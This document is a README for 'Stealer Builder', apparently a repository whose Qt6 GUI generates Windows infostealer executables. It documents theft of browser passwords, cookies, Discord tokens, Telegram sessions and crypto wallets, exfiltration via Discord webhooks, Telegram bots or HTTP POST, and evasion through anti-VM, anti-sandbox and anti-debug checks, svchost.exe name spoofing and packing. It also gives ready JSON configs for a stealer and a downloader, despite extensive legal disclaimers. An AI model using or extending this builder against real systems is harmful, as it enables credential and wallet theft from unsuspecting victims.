<div align="center">

# 🛡️ Stealer Builder

### Professional Red Team Payload Builder

A cross-platform Qt6-based GUI application for building Windows executables with advanced payload capabilities. Designed exclusively for authorized red team engagements and penetration testing.

[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-blue.svg)](#dependencies)
[![Qt Version](https://img.shields.io/badge/Qt-6.0+-green.svg)](https://www.qt.io/)
[![C++](https://img.shields.io/badge/C++-17-blue.svg)](https://isocpp.org/)

[Features](#features) • [Installation](#building-the-gui-application) • [Usage](#usage) • [Documentation](#architecture)

</div>

---

## ⚠️ LEGAL WARNING & DISCLAIMER

<div align="center">

### **THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY**

</div>

> **CRITICAL NOTICE:** This software is designed exclusively for legal, authorized security testing purposes. By downloading, compiling, or using this software, you acknowledge and agree to the following terms:

#### Legal Requirements
- ✅ **Only use on systems you own** or have **explicit written permission** to test
- ❌ **Unauthorized use violates** computer fraud laws worldwide including:
  - Computer Fraud and Abuse Act (CFAA) - United States
  - Computer Misuse Act - United Kingdom
  - GDPR - European Union
  - Equivalent laws in other jurisdictions

#### Liability
- 🔒 You are **solely responsible** for any misuse of this software
- 🚫 The authors assume **no liability** for illegal use or damages
- ⚖️ Violations may result in criminal prosecution and civil penalties

#### Intended Use Cases
- ✓ Authorized penetration testing engagements
- ✓ Red team operations with proper authorization
- ✓ Security research in controlled environments
- ✓ Educational purposes in academic settings

<div align="center">

**USE ETHICALLY. USE RESPONSIBLY. USE LEGALLY.**

</div>

---

## 📋 Table of Contents

- [Features](#-features)
- [Prerequisites](#-prerequisites)
- [Installation](#-installation)
- [Usage](#-usage)
- [Configuration Examples](#-configuration-examples)
- [Architecture](#-architecture)
- [Development](#-development)
- [Security Considerations](#-security-considerations)
- [Troubleshooting](#-troubleshooting)
- [Contributing](#-contributing)
- [Resources](#-resources)

---

## ✨ Features

<table>
<tr>
<td width="50%">

### 🖥️ Cross-Platform Builder

- ✅ Runs on **Linux** and **Windows**
- 🎯 Generates **Windows PE executables** (x86/x64)
- 🎨 Modern Qt6 tabbed interface
- 🔤 **Embedded fonts** - no installation required
- 🔄 Cross-compilation support (Linux → Windows)

### 📦 Payload Capabilities

- 🌐 **Download & Execute** - Fetch and run payloads
- 🔐 **Browser Data Extraction**
  - Chrome, Firefox, Edge, Brave
  - Passwords, cookies, browsing history
  - Credential decryption (DPAPI)
- 💬 **Application Data**
  - Discord tokens
  - Telegram session files
- 💰 **Cryptocurrency Wallets**
  - Exodus, Atomic, Electrum
- 📊 **System Information**
  - HWID, IP address, OS version
  - Installed antivirus detection
  - Running processes enumeration
- 📸 **Screenshots** - Desktop capture

</td>
<td width="50%">

### 🥷 Anti-Detection Features

- 👻 **Stealth Capabilities**
  - Hidden console execution
  - Process name spoofing
  - Mutex-based single instance
  - Self-destruct options
- 🚫 **Anti-VM Detection**
  - VirtualBox detection
  - VMware detection
  - QEMU detection
- 🛡️ **Anti-Sandbox**
  - Cuckoo Sandbox detection
  - Any.run detection
- 🐛 **Anti-Debug**
  - `IsDebuggerPresent` checks
  - Remote debugger detection
- ⏱️ **Sleep Evasion** - Timing-based sandbox detection

### 📤 Data Exfiltration

- 🔗 Discord webhooks
- 🌐 HTTP POST endpoints
- 🤖 Telegram bot integration

### ⚙️ Build Options

- 🔗 Static linking for portability
- 🏗️ Architecture selection (x86/x64)
- 🔐 String obfuscation (XOR encoding)
- 📦 UPX packing support
- 🎨 Custom icon embedding

</td>
</tr>
</table>

---

## 📦 Prerequisites

### System Requirements

| Component | Minimum Version | Purpose |
|-----------|----------------|---------|
| **CMake** | 3.16+ | Build system |
| **Qt** | 6.0+ | GUI framework |
| **C++ Compiler** | C++17 support | Code compilation |
| **MinGW-w64** (Linux) | Latest | Cross-compilation to Windows |
| **MSVC/MinGW** (Windows) | 2019+ | Native Windows compilation |

---

## 🔧 Installation

### Step 1: Install Build Dependencies

<details>
<summary><b>🐧 Ubuntu/Debian</b></summary>

```bash
# Update package list
sudo apt-get update

# Install Qt6 and build tools
sudo apt-get install -y \
    build-essential \
    cmake \
    qt6-base-dev \
    qt6-base-dev-tools

# Install MinGW for cross-compilation
sudo apt-get install -y mingw-w64

# [Optional] Install UPX for executable packing
sudo apt-get install -y upx-ucl
```

</details>

<details>
<summary><b>🎩 Fedora/RHEL/CentOS</b></summary>

```bash
# Install Qt6 and build tools
sudo dnf install -y \
    gcc-c++ \
    cmake \
    qt6-qtbase-devel

# Install MinGW for cross-compilation
sudo dnf install -y \
    mingw64-gcc \
    mingw64-gcc-c++

# [Optional] Install UPX for executable packing
sudo dnf install -y upx
```

</details>

<details>
<summary><b>🏔️ Arch Linux</b></summary>

```bash
# Install Qt6 and build tools
sudo pacman -S \
    base-devel \
    cmake \
    qt6-base

# Install MinGW for cross-compilation
sudo pacman -S mingw-w64-gcc

# [Optional] Install UPX for executable packing
sudo pacman -S upx
```

</details>

<details>
<summary><b>🪟 Windows</b></summary>

**Required:**
1. **CMake** (3.16+)
   - Download from [cmake.org/download](https://cmake.org/download/)
   - Add to PATH during installation

2. **Qt6**
   - Download installer from [qt.io/download-qt-installer](https://www.qt.io/download-qt-installer)
   - Select Qt 6.x for your compiler during installation

3. **C++ Compiler** (choose one):
   - **Visual Studio 2019+**
     - Install "Desktop development with C++" workload
     - Download from [visualstudio.microsoft.com](https://visualstudio.microsoft.com/)
   - **MinGW-w64**
     - Download from [mingw-w64.org](https://www.mingw-w64.org/)
     - Add to PATH

**Optional:**
4. **UPX** (for packing)
   - Download from [upx.github.io](https://upx.github.io/)
   - Extract and add to PATH

</details>



---

## 🔨 Building the GUI Application

### Quick Build (Recommended)

The automated build scripts handle everything including font downloads:

<table>
<tr>
<td width="50%">

**🐧 Linux**
```bash
chmod +x build.sh
./build.sh
```

The executable will be at:
```
build/bin/StealerBuilder
```

</td>
<td width="50%">

**🪟 Windows**
```cmd
build.bat
```

The executable will be at:
```
build\bin\Release\StealerBuilder.exe
```

</td>
</tr>
</table>

### Manual Build

<details>
<summary><b>🐧 Linux (Manual Build)</b></summary>

```bash
# Download fonts first
cd fonts && ./download_fonts.sh && cd ..

# Create build directory
mkdir -p build && cd build

# Generate build files
cmake ..

# Compile
make -j$(nproc)

# Run the application
./bin/StealerBuilder
```

</details>

<details>
<summary><b>🪟 Windows - Visual Studio (Manual Build)</b></summary>

```powershell
# Download fonts first
cd fonts
.\download_fonts.bat
cd ..

# Create build directory
mkdir build
cd build

# Generate Visual Studio solution
cmake .. -G "Visual Studio 16 2019"

# Build (choose one):
# Option 1: Command line
cmake --build . --config Release

# Option 2: Open Visual Studio
start StealerBuilder.sln

# Run the application
bin\Release\StealerBuilder.exe
```

</details>

<details>
<summary><b>🪟 Windows - MinGW (Manual Build)</b></summary>

```bash
# Download fonts first
cd fonts
download_fonts.bat
cd ..

# Create build directory
mkdir build
cd build

# Generate MinGW Makefiles
cmake .. -G "MinGW Makefiles"

# Build
cmake --build .

# Run the application
bin\StealerBuilder.exe
```

</details>

## 🚀 Usage

### 1. Launch the Application
```bash
./StealerBuilder  # Linux
StealerBuilder.exe  # Windows
```

### 2. Configure Your Payload

Navigate through the intuitive tabbed interface to configure your payload:

<details>
<summary><b>📥 Downloader Tab</b></summary>

Configure file download and execution:
- **URL**: Enter the payload download URL
- **Save Path**: Specify destination (supports environment variables: `%TEMP%`, `%APPDATA%`, `%USERPROFILE%`)
- **Execution Parameters**: Add command-line arguments for the downloaded file

</details>

<details>
<summary><b>🌐 Grabber Tab</b></summary>

Select data sources to extract:
- **Browsers**: Chrome, Firefox, Edge, Brave (passwords, cookies, history)
- **Messaging**: Discord tokens, Telegram sessions
- **Crypto Wallets**: Exodus, Atomic, Electrum

</details>

<details>
<summary><b>📤 Exfiltration Tab</b></summary>

Choose your data exfiltration method:
- **Discord Webhook**: `https://discord.com/api/webhooks/{id}/{token}`
- **HTTP POST**: Custom endpoint URL
- **Telegram Bot**: Bot token + Chat ID

</details>

<details>
<summary><b>📸 Screenshots Tab</b></summary>

Configure capture options:
- **Desktop Screenshot**: Capture current screen
- **Webcam Capture**: Capture from connected camera (if available)

</details>

<details>
<summary><b>💻 System Info Tab</b></summary>

Select system information to collect:
- Hardware ID (HWID)
- Public IP address
- Operating system version
- Installed antivirus software
- Running processes
- System specifications

</details>

<details>
<summary><b>🥷 Stealth Tab</b></summary>

Configure stealth features:
- **Hide Console**: Run without visible window (recommended)
- **Process Name**: Spoof process name for disguise
- **Mutex**: Ensure single instance execution
- **Self-Destruct**: Delete after execution (optional)

</details>

<details>
<summary><b>🛡️ Anti-Analysis Tab</b></summary>

Enable detection evasion:
- **Anti-VM**: Detect virtual machine environments
- **Anti-Sandbox**: Detect automated analysis systems
- **Anti-Debug**: Detect debugger attachment
- **Sleep Evasion**: Bypass time-based sandbox detection

</details>

<details>
<summary><b>⚙️ Build Options Tab</b></summary>

Configure build settings:
- **Output Filename**: Name of the generated executable
- **Architecture**: Select `x86` (32-bit) or `x64` (64-bit)
- **String Obfuscation**: Enable XOR encoding of strings
- **UPX Packing**: Compress executable (requires UPX installed)
- **Custom Icon**: Embed custom icon file (optional)
- **Compiler Selection**: Auto-detect or manually select compiler

</details>

### 3. Build Executable

Click the **"Build Executable"** button. The build process:

1. ✅ Validates configuration settings
2. 🔧 Generates C++ source code with configured features
3. 🔨 Compiles using selected compiler (MinGW/MSVC)
4. 📦 Optionally packs with UPX compression
5. 💾 Outputs final Windows PE executable

### 4. Save/Load Configurations

- **💾 Save Config**: Export settings to JSON file for reuse
- **📂 Load Config**: Import previously saved configuration
- **📋 Example Config**: See configuration examples below

---

## 📝 Configuration Examples

### Example 1: Simple Downloader

```json
{
  "downloader": {
    "url": "https://example.com/payload.exe",
    "savePath": "%TEMP%\\update.exe",
    "execParams": "/silent"
  },
  "stealth": {
    "hideConsole": true,
    "mutex": "MyApp_SingleInstance"
  },
  "buildOptions": {
    "architecture": "x64",
    "obfuscate": true
  }
}
```

**Use Case**: Download and execute a payload silently with stealth features.

---

### Example 2: Browser Credentials Stealer

```json
{
  "grabber": {
    "chrome": true,
    "firefox": true,
    "edge": true,
    "brave": true,
    "discord": true
  },
  "exfiltration": {
    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
  },
  "systemInfo": {
    "hwid": true,
    "ip": true,
    "os": true,
    "av": true
  },
  "stealth": {
    "hideConsole": true
  },
  "antiAnalysis": {
    "vm": true,
    "sandbox": true,
    "debug": true
  },
  "buildOptions": {
    "architecture": "x64",
    "obfuscate": true,
    "upx": true
  }
}
```

**Use Case**: Extract browser credentials and system info with full anti-analysis protection.

---

### Example 3: Comprehensive Red Team Payload

```json
{
  "downloader": {
    "url": "https://c2.example.com/stage2.exe",
    "savePath": "%APPDATA%\\Microsoft\\update.exe",
    "execParams": "--silent --no-gui"
  },
  "grabber": {
    "chrome": true,
    "firefox": true,
    "discord": true,
    "telegram": true,
    "wallets": ["exodus", "atomic", "electrum"]
  },
  "exfiltration": {
    "telegram": {
      "token": "YOUR_BOT_TOKEN",
      "chatId": "YOUR_CHAT_ID"
    }
  },
  "screenshots": {
    "desktop": true
  },
  "systemInfo": {
    "hwid": true,
    "ip": true,
    "os": true,
    "av": true,
    "processes": true
  },
  "stealth": {
    "hideConsole": true,
    "processName": "svchost.exe",
    "mutex": "Global\\MyMutex",
    "selfDestruct": false
  },
  "antiAnalysis": {
    "vm": true,
    "sandbox": true,
    "debug": true,
    "sleepEvasion": true
  },
  "buildOptions": {
    "architecture": "x64",
    "obfuscate": true,
    "upx": true,
    "icon": "path/to/custom.ico"
  }
}
```

**Use Case**: Full-featured red team payload with anti-analysis and comprehensive data gathering.

---

## 🔄 Cross-Compilation Notes

### Linux → Windows Cross-Compilation

The builder automatically detects and uses MinGW-w64 for cross-compilation on Linux:

| Component | Value |
|-----------|-------|
| **Compiler** | `x86_64-w64-mingw32-g++` (x64) / `i686-w64-mingw32-g++` (x86) |
| **Output Format** | Windows PE executable |
| **Linking** | Static (no DLL dependencies) |
| **Runtime** | Statically linked libgcc/libstdc++ |

### Testing Generated Executables

Since payloads are Windows PE files, testing options:

✅ **Recommended**: Windows VM (VirtualBox, VMware, QEMU)
- Isolated environment
- Full Windows API support
- Snapshot/rollback capabilities

⚠️ **Limited**: Wine on Linux
- Partial Windows API compatibility
- May not work with all features
- Not recommended for production testing

---

## 🛠️ Troubleshooting

<details>
<summary><b>❌ "No compiler found" Error</b></summary>

**Cause**: Required compiler not installed or not in PATH

**Solution**:
- **Linux**: Install MinGW-w64
  ```bash
  sudo apt-get install mingw-w64  # Ubuntu/Debian
  sudo dnf install mingw64-gcc mingw64-gcc-c++  # Fedora
  sudo pacman -S mingw-w64-gcc  # Arch
  ```
- **Windows**: Install Visual Studio 2019+ or MinGW-w64
  - Ensure compiler is added to system PATH
  - Restart application after installation

</details>

<details>
<summary><b>🔧 Compilation Errors</b></summary>

**Common Issues**:
1. **Outdated Compiler**
   - Requires GCC 7+ or MSVC 2019+
   - Check version: `g++ --version` or `cl /?`

2. **Missing Windows SDK** (Windows only)
   - Install Visual Studio with "Desktop development with C++"
   - Or install Windows SDK separately

3. **UPX Packing Fails**
   - Try building without UPX first
   - Ensure UPX is installed and in PATH
   - Check UPX version: `upx --version`

**Debug Steps**:
```bash
# Check compiler availability
x86_64-w64-mingw32-g++ --version  # Linux
g++ --version  # Windows MinGW
cl /?  # Windows MSVC

# Try minimal build without extras
# Disable: UPX packing, obfuscation, custom icon
```

</details>

<details>
<summary><b>🚫 Generated Executable Doesn't Run</b></summary>

**Expected Behavior**:
- ⚠️ Antivirus/Windows Defender may flag the executable
- This varies based on configuration and evasion settings

**Solutions**:
1. **Antivirus Interference**
   - Add exclusion in Windows Defender if needed
   - Test in isolated VM for controlled testing
   - Configure evasion techniques for better stealth

2. **Architecture Mismatch**
   - Verify target system architecture
   - x86 executables run on x64 Windows
   - x64 executables **only** run on x64 Windows

3. **Missing Dependencies**
   - Ensure static linking is enabled
   - Check build logs for linking errors

**Testing Environment**:
- Use clean Windows 10/11 VM
- Take snapshot before testing
- Monitor with Process Monitor/Procmon

</details>

<details>
<summary><b>📤 Exfiltration Not Working</b></summary>

**Webhook Issues**:
1. **Invalid Webhook URL**
   - Verify URL format: `https://discord.com/api/webhooks/{id}/{token}`
   - Test webhook manually: `curl -X POST <webhook_url> -H "Content-Type: application/json" -d '{"content":"test"}'`

2. **Network Connectivity**
   - Check target has internet access
   - Verify firewall isn't blocking outbound HTTPS
   - Try different exfiltration method (HTTP POST vs Discord vs Telegram)

3. **Certificate Issues**
   - Ensure valid SSL certificate on endpoint
   - Use HTTPS (not HTTP) for webhooks

**Telegram Bot Issues**:
- Verify bot token is valid
- Ensure chat ID is correct (use @userinfobot to get ID)
- Bot must have started conversation with user

</details>

<details>
<summary><b>🖥️ Qt Application Issues</b></summary>

**Application Won't Start**:
- Ensure Qt6 is properly installed
- Check LD_LIBRARY_PATH includes Qt libs (Linux)
- Verify all fonts were downloaded successfully

**Font Rendering Issues**:
- Run font download script manually:
  ```bash
  cd fonts && ./download_fonts.sh && cd ..
  ```
- Rebuild application after font download

</details>

---

## 🏗️ Architecture

### GUI Application (C++/Qt6)
```
StealerBuilder (GUI)
├── MainWindow: Tabbed configuration interface
├── CompilerManager: Detect and manage compilers
├── StubGenerator: Generate C++ source from config
├── Builder: Invoke compiler with proper flags
└── Config: Load/save JSON configurations
```

### Generated Stub (C++/WinAPI)
```
stub.exe (Windows PE)
├── Anti-Analysis: VM/sandbox/debug detection
├── Downloader: URLDownloadToFile + ShellExecute
├── Browser Grabber: SQLite + DPAPI decryption
├── System Info: WinAPI system information
├── Screenshots: GDI+ screen capture
└── Exfiltration: WinHTTP POST to webhook/endpoint
```

---

## 💻 Development

### Project Structure

```
stealer-gui/
├── 📄 CMakeLists.txt           # CMake build configuration
├── 📄 README.md                # This documentation
├── 📄 ARCHITECTURE.md          # Detailed architecture docs
├── 📄 LICENSE                  # License file
├── 📄 example_config.json      # Example configuration
│
├── 🔨 build.sh                 # Linux build script
├── 🔨 build.bat                # Windows build script
├── 📄 resources.qrc            # Qt resource file (fonts, icons)
│
├── 📁 src/                     # Source code
│   ├── 📄 main.cpp             # Application entry point
│   │
│   ├── 📁 ui/                  # User interface
│   │   ├── mainwindow.h
│   │   └── mainwindow.cpp      # Main window & tabs
│   │
│   ├── 📁 config/              # Configuration
│   │   ├── config.h
│   │   └── config.cpp          # JSON serialization
│   │
│   ├── 📁 generator/           # Code generation
│   │   ├── stubgenerator.h
│   │   └── stubgenerator.cpp   # C++ stub generation
│   │
│   └── 📁 compiler/            # Compiler management
│       ├── compilermanager.h
│       ├── compilermanager.cpp
│       ├── builder.h
│       └── builder.cpp
│
├── 📁 fonts/                   # Embedded fonts
│   ├── download_fonts.sh
│   ├── download_fonts.bat
│   └── *.ttf                   # Liberation fonts
│
└── 📁 build/                   # Build output (generated)
    └── bin/
        └── StealerBuilder      # Compiled executable
```

### Tech Stack

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **GUI Framework** | Qt 6 | Cross-platform interface |
| **Build System** | CMake 3.16+ | Build orchestration |
| **Language** | C++17 | Application logic |
| **Serialization** | JSON | Configuration storage |
| **Target Output** | C++/WinAPI | Generated payloads |

### Adding New Features

<details>
<summary><b>Step-by-Step Guide</b></summary>

**1. Update Configuration Schema** (`src/config/config.h`)
```cpp
struct Config {
    // Existing fields...
    
    // Add new feature configuration
    bool enableNewFeature;
    std::string newFeatureSetting;
};
```

**2. Add UI Controls** (`src/ui/mainwindow.cpp`)
```cpp
// In MainWindow constructor or tab creation
QCheckBox* newFeatureCheckbox = new QCheckBox("Enable New Feature");
QLineEdit* newFeatureInput = new QLineEdit();

// Add to layout
layout->addWidget(newFeatureCheckbox);
layout->addWidget(newFeatureInput);

// Connect signals
connect(newFeatureCheckbox, &QCheckBox::stateChanged, 
        this, &MainWindow::onNewFeatureChanged);
```

**3. Implement Code Generation** (`src/generator/stubgenerator.cpp`)
```cpp
QString StubGenerator::generate(const Config& config) {
    QString sourceCode;
    
    // Add includes if needed
    if (config.enableNewFeature) {
        sourceCode += "#include <new_header.h>\n";
    }
    
    // Add implementation
    if (config.enableNewFeature) {
        sourceCode += R"(
void newFeatureFunction() {
    // Feature implementation
}
)";
    }
    
    return sourceCode;
}
```

**4. Update JSON Serialization** (`src/config/config.cpp`)
```cpp
// Save
QJsonObject Config::toJson() const {
    QJsonObject json;
    json["enableNewFeature"] = enableNewFeature;
    json["newFeatureSetting"] = QString::fromStdString(newFeatureSetting);
    return json;
}

// Load
void Config::fromJson(const QJsonObject& json) {
    enableNewFeature = json["enableNewFeature"].toBool();
    newFeatureSetting = json["newFeatureSetting"].toString().toStdString();
}
```

**5. Rebuild & Test**
```bash
cd build
cmake --build .
./bin/StealerBuilder  # Test your changes
```

</details>

### Build System Details

The project uses CMake with the following key features:

- **Qt6 Integration**: Automatic MOC, UIC, RCC processing
- **Resource Embedding**: Fonts and icons embedded via `resources.qrc`
- **Cross-Platform**: Supports Linux, Windows (MSVC/MinGW)
- **Static Linking**: Generated payloads have no external dependencies

---

## 🔒 Security Considerations

### For Red Team Operators

<table>
<tr>
<td width="50%">

#### ✅ Best Practices

- **Authorization First**
  - Obtain written permission before deployment
  - Define scope and boundaries clearly
  - Document authorized targets

- **Secure Operations**
  - Use HTTPS for all exfiltration
  - Encrypt sensitive data in transit
  - Test in isolated lab environments first

- **Documentation**
  - Log all systems accessed
  - Document payload deployment
  - Track configuration used

- **Cleanup**
  - Remove payloads after engagement
  - Delete exfiltrated test data
  - Provide detailed remediation report

</td>
<td width="50%">

#### ⚠️ Risk Awareness

- **Legal Risks**
  - Unauthorized use is illegal
  - May violate CFAA, GDPR, etc.
  - Criminal and civil penalties apply

- **Technical Risks**
  - Payloads **will be detected** by AV/EDR
  - May trigger incident response
  - Network monitoring will log activity

- **Ethical Risks**
  - Only use for authorized testing
  - Respect privacy and data protection
  - Follow responsible disclosure

</td>
</tr>
</table>

### Detection Considerations

This tool generates executables that may be detected by security solutions:

| Security Solution | Detection Method | Likelihood |
|-------------------|------------------|------------|
| **Windows Defender** | Signature + Behavioral | 🟡 Medium |
| **Commercial AV** | Signature + Heuristic | 🟡 Medium |
| **EDR Systems** | Behavioral Analysis | 🟡 Medium |
| **Sandboxes** | Dynamic Analysis | 🟢 Low-Medium |
| **Network IDS/IPS** | Traffic Patterns | 🟢 Low |

> **Note**: Detection rates vary based on configuration and target environment. The tool includes evasion techniques but is designed for **authorized testing scenarios**.

### Evasion Techniques

The tool includes various evasion features for red team scenarios:

<details>
<summary><b>Included Techniques</b></summary>

1. **String Obfuscation**
   - XOR encoding of sensitive strings
   - Runtime decryption
   - **Effectiveness**: Moderate

2. **Anti-Debugging**
   - `IsDebuggerPresent()` checks
   - Remote debugger detection
   - **Effectiveness**: Moderate

3. **Anti-VM Detection**
   - Registry key checks
   - CPUID instruction analysis
   - **Effectiveness**: Good

4. **Anti-Sandbox**
   - Sleep evasion techniques
   - Timing checks
   - **Effectiveness**: Moderate

5. **Stealth Features**
   - Hidden console window
   - Process name spoofing
   - **Effectiveness**: Good

</details>

> **Note**: These techniques are designed for red team engagements and may help bypass basic security controls in controlled testing environments.

---

## 🤝 Contributing

We welcome contributions that improve this educational red team tool!

### Contribution Guidelines

<table>
<tr>
<td width="50%">

#### ✅ Welcome Contributions

- **Code Quality**
  - Bug fixes
  - Performance improvements
  - Code refactoring
  - Better error handling

- **Features**
  - Legitimate red team/pentest capabilities
  - Additional evasion techniques (educational)
  - New payload features
  - UI/UX improvements

- **Documentation**
  - README improvements
  - Code comments
  - Architecture documentation
  - Usage examples

</td>
<td width="50%">

#### ❌ Rejected Contributions

- **Malicious Intent**
  - Features solely for illegal use
  - Backdoors or hidden functionality
  - Unethical capabilities

- **Poor Quality**
  - Unmaintainable code
  - Missing documentation
  - Breaking changes without discussion

</td>
</tr>
</table>

### How to Contribute

1. **Fork the Repository**
2. **Create a Feature Branch**
   ```bash
   git checkout -b feature/your-feature-name
   ```
3. **Make Your Changes**
   - Follow existing code style
   - Add comments where needed
   - Update documentation
4. **Test Thoroughly**
   - Build on Linux and Windows (if possible)
   - Test generated executables
5. **Submit Pull Request**
   - Describe your changes clearly
   - Reference any related issues
   - Explain testing performed

---

## 📜 License

This project is provided for **educational and authorized security testing purposes only**.

By using this software, you acknowledge and agree:
- To use it **only** for legal, authorized purposes
- That you are **solely responsible** for any misuse
- That the authors assume **no liability** for damages or illegal use

See [LICENSE](LICENSE) file for full details.

---

## ⚖️ Disclaimer

```
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.

THE AUTHORS ARE NOT RESPONSIBLE FOR ANY MISUSE, DAMAGE, OR ILLEGAL ACTIVITY
CAUSED BY THIS PROGRAM.

USE AT YOUR OWN RISK.
```

### Intended Use Cases

<div align="center">

| ✅ Authorized Use | ❌ Prohibited Use |
|------------------|-------------------|
| Penetration testing with written authorization | Unauthorized computer access |
| Red team engagements for clients | Stealing credentials without permission |
| Security research in labs | Deploying on production systems without consent |
| Educational purposes in academic settings | Commercial malware development |
| Testing detection capabilities | Any illegal activity |

</div>

<div align="center">

### ⚠️ **UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL** ⚠️

</div>

---

## 📚 Resources

### Red Team & Penetration Testing

- 🎯 [MITRE ATT&CK Framework](https://attack.mitre.org/) - Adversary tactics and techniques
- 🔒 [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Web application security testing
- 📖 [Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504) - Red team reference guide
- 🛡️ [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page) - Penetration testing methodology

### Security Tools & Frameworks

- 🔧 [Metasploit Framework](https://www.metasploit.com/) - Penetration testing framework
- 🐉 [Cobalt Strike](https://www.cobaltstrike.com/) - Adversary simulation platform
- 📊 [Atomic Red Team](https://atomicredteam.io/) - Test security controls
- 🔍 [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/) - Windows analysis tools

### Learning Resources

- 🎓 [Offensive Security](https://www.offensive-security.com/) - OSCP, OSEP certifications
- 📺 [IppSec YouTube](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) - HackTheBox walkthroughs
- 💻 [HackTheBox](https://www.hackthebox.eu/) - Penetration testing labs
- 🚩 [TryHackMe](https://tryhackme.com/) - Guided cybersecurity training

---

## 💬 Support & Contact

### Get Help

| Issue Type | Solution |
|-----------|----------|
| 🔧 **Compilation Errors** | Check [Troubleshooting](#-troubleshooting) section |
| 🖥️ **Qt/CMake Issues** | Verify installation via [Prerequisites](#-prerequisites) |
| 🔍 **Compiler Detection** | Ensure MinGW-w64/MSVC is in PATH |
| 💡 **Feature Requests** | Open an issue on the repository |
| 🐛 **Bug Reports** | Open an issue with reproduction steps |
| 🔒 **Security Concerns** | Report privately to maintainers |

### Community

- **Issues**: Use GitHub Issues for bug reports and feature requests
- **Discussions**: For questions and general discussion
- **Pull Requests**: For code contributions

---

<div align="center">

## 🛡️ Final Reminder

**With great power comes great responsibility.**

This tool is a double-edged sword - use it to **defend**, not attack.

**Always obtain authorization. Always act ethically. Always follow the law.**

---

*Built for red teamers, by security professionals.*

*Stay legal. Stay ethical. Stay secure.*

</div>





// Commit 46 - 2024-06-13


// Commit 58 - 2024-07-23



